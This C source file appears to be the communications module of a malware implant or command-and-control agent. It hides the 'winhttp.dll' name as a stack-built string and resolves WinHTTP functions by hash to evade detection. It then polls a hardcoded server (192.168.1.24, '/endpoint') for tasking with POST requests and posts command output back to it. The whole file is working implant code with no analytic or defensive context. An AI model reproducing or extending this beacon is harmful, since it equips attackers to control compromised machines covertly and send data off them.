#include "../../includes/core/core.h"
#include "../../includes/comms/comms.h"


BOOL NwLoadApis() {
	CHAR dll[12];
	dll[11]  = '\0';
	dll[10]  = 'l';
	dll[9]   = 'l';
	dll[8]   = 'd';
	dll[7]   = '.';
	dll[6]   = 'p';
	dll[5]   = 't';
	dll[4]   = 't';
	dll[3]   = 'h';
	dll[2]   = 'n';
	dll[1]   = 'i';
	dll[0]   = 'w';

 	HMODULE winhttp = ldr->win32->LoadLibraryA(dll);
 	if(!winhttp) {
 		return FALSE;
 	}

 	ldr->win32->WinHttpOpen = (pWinHttpOpen)GetProc(winhttp, HASHED_WinHttpOpen);
    ldr->win32->WinHttpConnect = (pWinHttpConnect)GetProc(winhttp, HASHED_WinHttpConnect);
    ldr->win32->WinHttpOpenRequest = (pWinHttpOpenRequest)GetProc(winhttp, HASHED_WinHttpOpenRequest);
    ldr->win32->WinHttpAddRequestHeaders = (pWinHttpAddRequestHeaders)GetProc(winhttp, HASHED_WinHttpAddRequestHeaders);
    ldr->win32->WinHttpSendRequest = (pWinHttpSendRequest)GetProc(winhttp, HASHED_WinHttpSendRequest);
    ldr->win32->WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProc(winhttp, HASHED_WinHttpReceiveResponse);
    ldr->win32->WinHttpQueryHeaders = (pWinHttpQueryHeaders)GetProc(winhttp, HASHED_WinHttpQueryHeaders);
    ldr->win32->WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProc(winhttp, HASHED_WinHttpQueryDataAvailable);
    ldr->win32->WinHttpReadData = (pWinHttpReadData)GetProc(winhttp, HASHED_WinHttpReadData);
    ldr->win32->WinHttpSetOption = (pWinHttpSetOption)GetProc(winhttp, HASHED_WinHttpSetOption);
    ldr->win32->WinHttpCloseHandle = (pWinHttpCloseHandle)GetProc(winhttp, HASHED_WinHttpCloseHandle);

    return TRUE;
}

PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize, BOOL bReadResponse) {
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD Size = 0, Downloaded = 0, TotalSize = 0, bufferSize = 4096;
    BOOL bResults;
    LPVOID outBuffer = NULL;

    hSession = ldr->win32->WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        NULL, NULL, 0);
    if (!hSession) goto CLEANUP;

    hConnect = ldr->win32->WinHttpConnect(hSession, L"192.168.1.24", 80, 0);
    if (!hConnect) {
        DBGA("[!] WinHttpConnect Failed\n");
        goto CLEANUP;
    }

    hRequest = ldr->win32->WinHttpOpenRequest(hConnect, L"POST", L"/endpoint", NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        DBGA("[!] WinHttpOpenRequest Failed\n");
        goto CLEANUP;
    }

    bResults = ldr->win32->WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        PostBody, PostBodySize,
        PostBodySize, 0);
    if (!bResults) {
        DBGA("[!] WinHttpSendRequest Failed\n");
        goto CLEANUP;
    }

    if (bReadResponse) {
        bResults = ldr->win32->WinHttpReceiveResponse(hRequest, NULL);
        if (!bResults) {
            DBGA("[!] WinHttpReceiveResponse Failed\n");
            goto CLEANUP;
        }

        outBuffer = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, bufferSize);
        if (!outBuffer) {
            DBGA("[!] LocalAlloc Failed\n");
            goto CLEANUP;
        }

        do {
            Size = 0;
            if (!ldr->win32->WinHttpQueryDataAvailable(hRequest, &Size))
                break;
            if (Size == 0)
                break;

            if (TotalSize + Size > bufferSize) {
                while (TotalSize + Size > bufferSize)
                    bufferSize *= 2;
                outBuffer = ldr->win32->LocalReAlloc(outBuffer, bufferSize, LMEM_MOVEABLE);
                if (!outBuffer) {
                    DBGA("[!] LocalReAlloc Failed\n");
                    goto CLEANUP;
                }
            }

            if (!ldr->win32->WinHttpReadData(hRequest, (PBYTE)outBuffer + TotalSize, Size, &Downloaded))
                break;

            TotalSize += Downloaded;
        } while (Size > 0);

        *PayloadSize = TotalSize;
    }

CLEANUP:
    if (hRequest) ldr->win32->WinHttpCloseHandle(hRequest);
    if (hConnect) ldr->win32->WinHttpCloseHandle(hConnect);
    if (hSession) ldr->win32->WinHttpCloseHandle(hSession);

    if (TotalSize == 0 && outBuffer) {
        ldr->win32->LocalFree(outBuffer);
        outBuffer = NULL;
    }

    return outBuffer;
}




PVOID NwPollServer(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
    return NwInternalDoPost(PayloadSize, PostBody, PostBodySize, TRUE);
}

BOOL NwPostOutput(PBYTE PostBody, DWORD PostBodySize) {
    NwInternalDoPost(NULL, PostBody, PostBodySize, FALSE);
    return TRUE;
}